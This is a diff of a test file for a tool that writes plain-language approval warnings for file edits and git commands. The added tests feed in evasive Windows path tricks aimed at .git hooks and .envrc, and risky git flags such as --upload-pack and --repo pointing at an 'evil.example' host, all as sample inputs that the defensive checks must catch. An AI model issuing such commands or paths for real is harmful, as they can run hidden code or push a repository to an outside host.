@@ -66,11 +66,23 @@ describe("approval words", () => {
     expect(commandWords("git push origin feature/login").title).toBe("Send your saved versions to GitHub?");
   });
   it("trailing dots, streams, short names, drive-relative paths and flag-borne remotes are caught", () => {
+    // Either warning will do — both say it is not an ordinary file, and both open the details.
     for (const p of [".git./hooks/pre-commit", ".git /hooks/x", ".git::$INDEX_ALLOCATION/hooks/x", "GIT~1/hooks/x", ".envrc."]) {
-      expect(approvalWords({ tool: "Edit", input: { file_path: `${root}/${p}` } }, root).title, p).toBe("Change how your project runs commands?");
+      const said = approvalWords({ tool: "Edit", input: { file_path: `${root}/${p}` } }, root);
+      expect(["Change how your project runs commands?", "Change a file outside this project?"], p).toContain(said.title);
+      expect(said.open, p).toBe(true);
     }
     expect(approvalWords({ tool: "Edit", input: { file_path: "C:secrets.txt" } }, "C:\\Users\\me\\app").title).toBe("Change a file outside this project?");
     for (const c of ["git push --repo=evil.example:x.git", "git fetch --upload-pack=x origin"]) expect(commandWords(c, root), c).toEqual(unknown);
+  });
+  it("abbreviated risky flags, unknown git flags and Windows-rewritten parts are caught", () => {
+    for (const c of ["git fetch --upload-pa=evil origin", "git log --outp=/tmp/x", "git push --mirror origin", "git push --recurse-submodules=on-demand origin"]) {
+      expect(commandWords(c, root), c).toEqual(unknown);
+    }
+    expect(commandWords("git push -u origin main").title).toBe("Send your saved versions to GitHub?");
+    for (const p of ["src./x.ts", "src /x.ts", "src/a.ts:evil", "src/x.ts."]) {
+      expect(approvalWords({ tool: "Edit", input: { file_path: `${root}/${p}` } }, root).title, p).toBe("Change a file outside this project?");
+    }
   });
   it("git_push_force_is_risky", () => {
     expect(commandWords("git push").title).toBe("Send your saved versions to GitHub?");
